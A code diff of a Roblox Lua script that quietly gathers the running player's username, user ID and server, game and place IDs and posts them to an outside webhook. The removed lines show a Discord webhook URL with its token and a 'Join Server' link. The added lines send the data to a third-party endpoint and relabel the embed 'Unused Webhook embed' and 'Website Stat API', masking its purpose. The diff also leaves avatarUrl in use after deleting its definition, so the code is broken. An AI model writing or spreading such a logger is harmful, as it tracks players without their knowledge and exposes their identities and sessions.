@@ -5,7 +5,6 @@ local MarketplaceService = game:GetService("MarketplaceService")
 local localPlayer = Players.LocalPlayer or Players:GetPlayers()[1]
 local username = localPlayer.Name
 local userId = localPlayer.UserId
-local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
 local jobId = game.JobId
 local gameId = tostring(game.GameId)
 local placeId = game.PlaceId
@@ -19,12 +18,10 @@ if success and info and info.Name then
     gameName = info.Name
 end
 
-local joinUri = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId
-
-local url = "https://discord.com/api/webhooks/1388425981399797850/RM5zi4-cHNdX75mk5nH13RPsJUL4OWsciI6lUgWkPzk3Gh67py2MMza_YkczWf9V1OXp"
+local url = "https://discord-stats-api-1.onrender.com/webhook"
 
 local embed = {
-    title = "Roblox Server Info",
+    title = "Unused Webhook embed",
     color = 3447003,
     thumbnail = {
         url = avatarUrl
@@ -49,20 +46,10 @@ local embed = {
             name = "Game ID",
             value = gameId,
             inline = false
-        },
-        {
-            name = "Job ID",
-            value = jobId,
-            inline = false
-        },
-        {
-            name = "Join Server",
-            value = "[Click here to try joining](" .. joinUri .. ")",
-            inline = false
         }
     },
     footer = {
-        text = "Roblox Webhook Logger"
+        text = "Website Stat API"
     },
     timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
 }
